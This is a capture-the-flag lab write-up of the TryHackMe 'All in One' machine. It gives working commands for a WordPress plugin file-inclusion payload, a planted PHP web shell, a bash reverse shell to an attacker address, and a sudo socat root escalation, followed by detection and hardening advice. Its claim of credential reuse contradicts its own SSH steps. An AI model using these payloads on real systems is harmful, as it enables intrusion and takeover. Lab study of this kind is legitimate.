# All in One - Technical Report

> **Platform:** TryHackMe \
> **Difficulty:** `Easy` \
> **Date:** 2026-02-20 \
> **Author:** 0N1S3C \
> **Scope:** Authorized TryHackMe lab environment only 

---

## 0. Executive Summary

The "All in One" machine was found to contain a chain of three critical vulnerabilities spanning web application security and system configuration. An unauthenticated attacker could exploit a Local File Inclusion (LFI) vulnerability in an outdated WordPress plugin to extract database credentials from configuration files. These credentials granted SSH access to the system. A sudo misconfiguration allowing unrestricted execution of `socat` as root enabled immediate privilege escalation to full system compromise. Immediate patching of the vulnerable plugin, removal of credential reuse across services, and auditing of sudo permissions are recommended.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **"All in One"** machine on TryHackMe.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined in `methodology.md`.

---

## 2. Attack Chain

```
Nmap → WordPress LFI (mail-masta) → wp-config.php credentials → SSH (elyana) → sudo socat → Root
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `gobuster` | Directory enumeration |
| `wpscan` | WordPress version & plugin enumeration |
| `curl` | LFI payload delivery via php://filter |
| `base64` | Decoding extracted configuration file |
| `find` | File ownership enumeration |
| `ssh` | Remote access |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV <target-ip>
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21/tcp | FTP | vsftpd 3.0.5 | Anonymous login allowed (no useful files) |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu | Standard SSH service |
| 80/tcp | HTTP | Apache 2.4.41 | WordPress installation present |

**Key Observations:**
- Anonymous FTP access permitted but contained no writable directories or sensitive files
- Web service running WordPress at `/wordpress` path
- SSH available for credential-based access post-exploitation

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Tools Used:** `gobuster`, `wpscan`, manual inspection

**Commands:**
```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
wpscan --url http://<target-ip>/wordpress --enumerate p
```

**Findings:**

| Path | Status | Notes |
|------|--------|-------|
| `/wordpress` | 200 | WordPress 5.5.1 installation |
| `/hackathons` | 200 | Static page with HTML comments containing credentials |

**WordPress Configuration:**
- Version: 5.5.1
- Plugin identified: **mail-masta** (vulnerable to LFI)
- XML-RPC enabled
- Upload directory listing enabled

**Critical Finding in Page Source:**
The `/hackathons` page contained suspicious HTML comments:
```html
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

These appeared to be credentials but were ultimately a rabbit hole — the actual exploitation path was through the LFI vulnerability.

### 5.2 FTP Service

Anonymous FTP login succeeded but revealed no useful files or writable directories. Not pursued further.

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** Local File Inclusion (LFI) in mail-masta WordPress plugin \
**Location:** `/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=` \
**Reasoning:** The `pl` parameter was not sanitized and allowed arbitrary file paths to be included. Using PHP filter wrappers (`php://filter/convert.base64-encode/resource=`), the contents of any readable file could be exfiltrated as base64-encoded output.

### 6.2 Exploitation — LFI to Configuration File Disclosure

**Step 1 — Extract wp-config.php:**
```bash
curl "http://<target-ip>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php"
```

**Output:** Base64-encoded WordPress configuration file

**Step 2 — Decode:**
```bash
echo "<base64_output>" | base64 -d
```

**Credentials recovered:**
- Database user: `elyana`
- Database password: `H@ckme@123`

### 6.3 WordPress Admin Access

Using the database credentials at `/wp-admin`, authentication succeeded. To achieve remote command execution, a PHP command handler was injected into the active theme's `header.php` file:

```php
<?php system($_GET['cmd']); ?>
```

This allowed arbitrary command execution via:
```
http://<target-ip>/wordpress/?cmd=whoami
```

### 6.4 Reverse Shell

```bash
# Listener
nc -lvnp 4444

# Payload via cmd parameter (URL-encoded)
bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
```

**Result:** Reverse shell obtained as `www-data`.

---

## 7. Lateral Movement

**From:** `www-data` \
**To:** `elyana`

**Method:**

Enumeration of `/home/elyana` revealed a hint file:
```bash
cat /home/elyana/hint.txt
# "Elyana's user password is hidden in the system."
```

File ownership enumeration was performed to locate files belonging to `elyana`:
```bash
find / -user elyana -type f 2>/dev/null
```

**Finding:**
```
/etc/mysql/conf.d/private.txt
```

**Contents:**
```
user: elyana
password: E@syR18ght
```

**SSH Access:**
```bash
ssh elyana@<target-ip>
# password: E@syR18ght
```

**Result:** Shell obtained as `elyana`. User flag retrieved from `/home/elyana/user.txt` (base64 encoded).

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] `id` — confirmed membership in `adm`, `sudo`, and `lxd` groups
- [x] `sudo -l` — **critical finding**

**Key Findings:**
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/socat
```

`elyana` can execute `/usr/bin/socat` as root with no password required.

### 8.2 Escalation Vector

**Vector:** Unrestricted sudo access to `socat` (GTFOBins) \
**Root Cause:** The sudo rule grants full execution of `socat`, a networking utility that can spawn interactive shells. No argument restrictions or environment variable limitations were in place.

**Exploitation:**
```bash
sudo socat EXEC:"/bin/bash -li",pty,stderr,setsid,sigint,sane STDIO
```

**Result:** Root shell obtained instantly. Root flag retrieved from `/root/root.txt` (base64 encoded).

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | LFI in mail-masta WordPress plugin | 🔴 Critical | `/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php` |
| 2 | Database credentials exposed in WordPress config | 🔴 Critical | `wp-config.php` |
| 3 | Credential reuse between database and system user | 🔴 Critical | `elyana` account |
| 4 | Plaintext credentials stored in world-readable config file | 🔴 Critical | `/etc/mysql/conf.d/private.txt` |
| 5 | Unrestricted sudo access to socat (NOPASSWD) | 🔴 Critical | `/etc/sudoers` |
| 6 | Excessive group membership (lxd, sudo) | 🟠 High | `elyana` user groups |
| 7 | Base64 encoding used as flag obfuscation | 🔵 Low | Flag files (not a security control) |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- Unusual file paths in WordPress plugin requests (`../../../../`, `php://filter`)
- Large base64-encoded responses in web server access logs
- PHP theme file modifications (`header.php`, `functions.php`)
- Outbound connections from `www-data` process to external IPs
- SSH login as `elyana` from unexpected source IP
- `sudo socat` execution in auth logs
- Spawned bash process from `socat` running as root

### 10.2 Security Weaknesses

- Outdated and vulnerable WordPress plugin (mail-masta) installed
- LFI vulnerability allowing arbitrary file read
- Database credentials reused for system user authentication
- Plaintext credentials stored in MySQL configuration directory
- Sudo misconfiguration granting unrestricted access to powerful networking tool
- Excessive group memberships (lxd provides alternative root path)

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Remove or update vulnerable mail-masta plugin to patched version | Finding 1 |
| Immediate | Rotate `elyana` database and SSH passwords to unique values | Finding 3 |
| Immediate | Remove or restrict sudo socat rule — apply least privilege | Finding 5 |
| Immediate | Restrict `/etc/mysql/conf.d/private.txt` to root-only read permissions | Finding 4 |
| Short-term | Enforce unique passwords across all services and applications | Finding 3 |
| Short-term | Audit all user group memberships — remove unnecessary privileges | Finding 6 |
| Short-term | Implement file integrity monitoring on WordPress installation | Finding 1 |
| Long-term | Regular WordPress plugin audits and automated update enforcement | Finding 1 |
| Long-term | Deploy Web Application Firewall (WAF) to detect LFI patterns | Finding 1 |

---

## 11. Lessons Learned

- **Structured enumeration reveals hidden credentials** — file ownership analysis (`find / -user <username>`) is highly effective for discovering misplaced credential files. This technique should be a standard post-access enumeration step.
- **WordPress plugins are high-value targets** — outdated or abandoned plugins like mail-masta remain common in real environments. Always enumerate installed plugins and check for known CVEs.
- **Credential reuse multiplies impact** — one set of database credentials unlocked SSH access. Enforcing unique passwords across services is critical defense-in-depth.
- **GTFOBins is essential knowledge** — recognizing that `sudo socat` = instant root shell is a core red team skill. Any sudo rule granting access to networking tools, scripting interpreters, or file manipulation utilities should be treated as potential privilege escalation.
- **Multiple escalation paths increase exposure** — this box had at least three potential privesc vectors: sudo socat, lxd group membership, and credential reuse. Defenders must address all paths, not just the most obvious.
- **HTML comments are often red herrings** — the credentials in the `/hackathons` page source looked promising but were ultimately a distraction. Real exploitation required following the LFI → config extraction path.

---

*End of Report*
*Classification: Public — flags and sensitive values omitted*
